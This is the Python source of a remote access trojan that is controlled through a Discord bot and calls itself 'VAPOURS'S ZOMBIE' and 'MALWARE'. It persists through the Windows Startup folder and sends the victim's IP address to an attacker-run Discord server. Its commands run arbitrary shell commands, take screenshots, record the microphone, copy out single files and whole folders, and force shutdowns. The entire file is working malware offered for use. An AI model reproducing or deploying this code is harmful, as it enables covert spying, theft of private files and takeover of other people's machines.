import discord
from discord.ext import commands
import subprocess
import os
import sys
from dotenv import load_dotenv
from utils.setupshortcut import create_shortcut
from config import TIME, VERSION, help_text, home_path, hostname
from utils.splitter import split_string
from utils.sysinfo import SystemInfo
from utils.screenshot import get_screenshot
from utils.cmd import run_shell_command
from utils.audio import record_audio

# Load .env explicitly from engine directory
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), ".env"))

# Determine the current file (py or exe) and set the shortcut path
current_file_path = sys.executable
current_file = os.path.basename(current_file_path)  # Absolute path of the current script/exe
shortcut_file = os.path.join(home_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", current_file.replace(".exe", ".lnk").replace(".py", ".lnk"))
try:
    create_shortcut(current_file, shortcut_file, description="My Shortcut")
except Exception as e:
    print(f"[!] Failed to create shortcut: {e}")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="", intents=intents)

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send("Pong!")

@bot.event
async def on_ready():
    guild_id = os.getenv("SERVER_ID")
    if guild_id:
        guild = bot.get_guild(int(guild_id))
        if guild:
            existing_channel = discord.utils.get(guild.text_channels, name=hostname)
            if existing_channel:
                await existing_channel.send(
                    f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
                    f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
                )
            else:
                new_channel = await guild.create_text_channel(name=hostname)
                await new_channel.send(
                    f"```**VAPOURS'S ZOMBIE WHOSE IP ADDRESS IS: {SystemInfo().ip_address} IS PRESENT. "
                    f"MALWARE.VERSION: {VERSION}, TIME: {TIME}**```"
                )

def is_correct_channel(ctx):
    return ctx.channel.name == hostname

@bot.command(name="screenshot")
async def screenshot(ctx):
    if is_correct_channel(ctx):
        image_bytes = get_screenshot()
        if image_bytes:
            file = discord.File(fp=image_bytes, filename='screenshot.png')
            await ctx.send("Screenshot:", file=file)
        else:
            await ctx.send("Failed to take screenshot.")

@bot.command(name="run")
async def shell_commands(ctx):
    if is_correct_channel(ctx):
        command = ctx.message.content.replace("run", '')
        try:
            result = split_string(run_shell_command(command))
            for chunk in result:
                await ctx.send(f"```{chunk}```")
        except:
            await ctx.send("```Failed to run command.```")

@bot.command(name="sysinfo")
async def sysinfo(ctx):
    if is_correct_channel(ctx):
        info = SystemInfo().system_info
        await ctx.send(f"```{info}```")

@bot.command(name="shutdown")
async def shutdown(ctx):
    if is_correct_channel(ctx):
        await ctx.send("```Shutting Down System.```")
        try:
            subprocess.run("shutdown /s /f /t 0")
        except Exception as e:
            await ctx.send(f"```Shutdown failed: {e}```")

@bot.command(name="capture-audio")
async def recordaudio(ctx):
    if is_correct_channel(ctx):
        message = ctx.message.content
        duration = int(message.replace("capture-audio ", "").strip())
        if duration <= 0:
            await ctx.send("```Duration must be a positive integer.```")
            return

        try:
            buffer = record_audio(duration)
            await ctx.send(file=discord.File(fp=buffer, filename="audio.wav"))
        except Exception as e:
            await ctx.send(f"```Error: {e}```")

@bot.command(name="grab-file")
async def grab_file(ctx):
    if is_correct_channel(ctx):
        message = ctx.message.content
        file = message.replace("grab-file ", '')
        try:
            await ctx.send(file=discord.File(file))
        except:
            await ctx.send("```INVALID FILE/AN ERROR OCCURED```")

@bot.command(name="help-tool")
async def haider(ctx):
    if is_correct_channel(ctx):
        await ctx.send(f"```{help_text}```")

@bot.command(name="grab-folder")
async def grabber(ctx):
    if is_correct_channel(ctx):
        message = ctx.message.content
        folder = message.replace("grab-folder ", '').strip()

        if not os.path.exists(folder):
            await ctx.send(f"```The folder '{folder}' does not exist.```")
            return

        await ctx.send(f"```Grabbing files from folder: {folder}```")
        await grab_files_in_folder(ctx, folder)

async def grab_files_in_folder(ctx, folder):
    try:
        files_in_folder = os.listdir(folder)
        await ctx.send(f"```Current directory: {folder}```")
        for file in files_in_folder:
            file_path = os.path.join(folder, file)
            if os.path.isfile(file_path):
                await ctx.send(file=discord.File(file_path))
            elif os.path.isdir(file_path):
                await grab_files_in_folder(ctx, file_path)
    except Exception as e:
        await ctx.send(f"```Error while accessing {folder}: {e}```")

token = os.getenv("DISCORD_TOKEN_VAPOUR")
bot.run(token)
